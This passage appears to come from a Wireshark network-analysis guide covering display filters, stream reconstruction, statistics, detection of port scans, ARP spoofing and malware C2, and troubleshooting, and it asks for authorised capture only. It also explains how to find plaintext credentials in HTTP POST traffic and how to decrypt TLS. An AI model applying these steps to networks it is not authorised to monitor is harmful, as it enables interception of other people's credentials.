ip.addr == 192.168.1.1 && tcp.port == 80

# OR operator
dns || http

# NOT operator
!(arp || icmp)

# Complex combinations
(ip.src == 192.168.1.1 || ip.src == 192.168.1.2) && tcp.port == 443
```

### Phase 3: Following Streams

#### TCP Stream Reconstruction
View complete TCP conversation:

```
1. Right-click on any TCP packet
2. Select Follow > TCP Stream
3. View reconstructed conversation
4. Toggle between ASCII, Hex, Raw views
5. Filter to show only this stream
```

#### Stream Types
| Stream | Access | Use Case |
|--------|--------|----------|
| TCP Stream | Follow > TCP Stream | Web, file transfers, any TCP |
| UDP Stream | Follow > UDP Stream | DNS, VoIP, streaming |
| HTTP Stream | Follow > HTTP Stream | Web content, headers |
| TLS Stream | Follow > TLS Stream | Encrypted traffic (if keys available) |

#### Stream Analysis Tips
- Review request/response pairs
- Identify transmitted files or data
- Look for credentials in plaintext
- Note unusual patterns or commands

### Phase 4: Statistical Analysis

#### Protocol Hierarchy
View protocol distribution:

```
Statistics > Protocol Hierarchy

Shows:
- Percentage of each protocol
- Packet counts
- Bytes transferred
- Protocol breakdown tree
```

#### Conversations
Analyze communication pairs:

```
Statistics > Conversations

Tabs:
- Ethernet: MAC address pairs
- IPv4/IPv6: IP address pairs
- TCP: Connection details (ports, bytes, packets)
- UDP: Datagram exchanges
```

#### Endpoints
View active network participants:

```
Statistics > Endpoints

Shows:
- All source/destination addresses
- Packet and byte counts
- Geographic information (if enabled)
```

#### Flow Graph
Visualize packet sequence:

```
Statistics > Flow Graph

Options:
- All packets or displayed only
- Standard or TCP flow
- Shows packet timing and direction
```

#### I/O Graphs
Plot traffic over time:

```
Statistics > I/O Graph

Features:
- Packets per second
- Bytes per second
- Custom filter graphs
- Multiple graph overlays
```

### Phase 5: Security Analysis

#### Detect Port Scanning
Identify reconnaissance activity:

```
# SYN scan detection (many ports, same source)
ip.src == SUSPECT_IP && tcp.flags.syn == 1

# Review Statistics > Conversations for anomalies
# Look for single source hitting many destination ports
```

#### Identify Suspicious Traffic
Filter for anomalies:

```
# Traffic to unusual ports
tcp.dstport > 1024 && tcp.dstport < 49152

# Traffic outside trusted network
!(ip.addr == 192.168.1.0/24)

# Unusual DNS queries
dns.qry.name contains "suspicious-domain"

# Large data transfers
frame.len > 1400
```

#### ARP Spoofing Detection
Identify ARP attacks:

```
# Duplicate ARP responses
arp.duplicate-address-frame

# ARP traffic analysis
arp

# Look for:
# - Multiple MACs for same IP
# - Gratuitous ARP floods
# - Unusual ARP patterns
```

#### Examine Downloads
Analyze file transfers:

```
# HTTP file downloads
http.request.method == "GET" && http contains "Content-Disposition"

# Follow HTTP Stream to view file content
# Use File > Export Objects > HTTP to extract files
```

#### DNS Analysis
Investigate DNS activity:

```
# All DNS traffic
dns

# DNS queries only
dns.flags.response == 0

# DNS responses only
dns.flags.response == 1

# Failed DNS lookups
dns.flags.rcode != 0

# Specific domain queries
dns.qry.name contains "domain.com"
```

### Phase 6: Expert Information

#### Access Expert Analysis
View Wireshark's automated findings:

```
Analyze > Expert Information

Categories:
- Errors: Critical issues
- Warnings: Potential problems
- Notes: Informational items
- Chats: Normal conversation events
```

#### Common Expert Findings
| Finding | Meaning | Action |
|---------|---------|--------|
| TCP Retransmission | Packet resent | Check for packet loss |
| Duplicate ACK | Possible loss | Investigate network path |
| Zero Window | Buffer full | Check receiver performance |
| RST | Connection reset | Check for blocks/errors |
| Out-of-Order | Packets reordered | Usually normal, excessive is issue |

## Quick Reference

### Keyboard Shortcuts
| Action | Shortcut |
|--------|----------|
| Open file | Ctrl+O |
| Save file | Ctrl+S |
| Start/Stop capture | Ctrl+E |
| Find packet | Ctrl+F |
| Go to packet | Ctrl+G |
| Next packet | ↓ |
| Previous packet | ↑ |
| First packet | Ctrl+Home |
| Last packet | Ctrl+End |
| Apply filter | Enter |
| Clear filter | Ctrl+Shift+X |

### Common Filter Reference
```
# Web traffic
http || https

# Email
smtp || pop || imap

# File sharing  
smb || smb2 || ftp

# Authentication
ldap || kerberos

# Network management
snmp || icmp

# Encrypted
tls || ssl
```

### Export Options
```
File > Export Specified Packets    # Save filtered subset
File > Export Objects > HTTP       # Extract HTTP files
File > Export Packet Dissections   # Export as text/CSV
```

## Constraints and Guardrails

### Operational Boundaries
- Capture only authorized network traffic
- Handle captured data according to privacy policies
- Avoid capturing sensitive credentials unnecessarily
- Properly secure PCAP files containing sensitive data

### Technical Limitations
- Large captures consume significant memory
- Encrypted traffic content not visible without keys
- High-speed networks may drop packets
- Some protocols require plugins for full decoding

### Best Practices
- Use capture filters to limit data collection
- Save captures regularly during long sessions
- Use display filters rather than deleting packets
- Document analysis findings and methodology

## Examples

### Example 1: HTTP Credential Analysis

**Scenario**: Investigate potential plaintext credential transmission

```
1. Filter: http.request.method == "POST"
2. Look for login forms
3. Follow HTTP Stream
4. Search for username/password parameters
```

**Finding**: Credentials transmitted in cleartext form data.

### Example 2: Malware C2 Detection

**Scenario**: Identify command and control traffic

```
1. Filter: dns
2. Look for unusual query patterns
3. Check for high-frequency beaconing
4. Identify domains with random-looking names
5. Filter: ip.dst == SUSPICIOUS_IP
6. Analyze traffic patterns
```

**Indicators**:
- Regular timing intervals
- Encoded/encrypted payloads
- Unusual ports or protocols

### Example 3: Network Troubleshooting

**Scenario**: Diagnose slow web application

```
1. Filter: ip.addr == WEB_SERVER
2. Check Statistics > Service Response Time
3. Filter: tcp.analysis.retransmission
4. Review I/O Graph for patterns
5. Check for high latency or packet loss
```

**Finding**: TCP retransmissions indicating network congestion.

## Troubleshooting

### No Packets Captured
- Verify correct interface selected
- Check for admin/root permissions
- Confirm network adapter is active
- Disable promiscuous mode if issues persist

### Filter Not Working
- Verify filter syntax (red = error)
- Check for typos in field names
- Use Expression button for valid fields
- Clear filter and rebuild incrementally

### Performance Issues
- Use capture filters to limit traffic
- Split large captures into smaller files
- Disable name resolution during capture
- Close unnecessary protocol dissectors

### Cannot Decrypt TLS/SSL
- Obtain server private key
- Configure at Edit > Preferences > Protocols > TLS
- For ephemeral keys, capture pre-master secret from browser
- Some modern ciphers cannot be decrypted passively
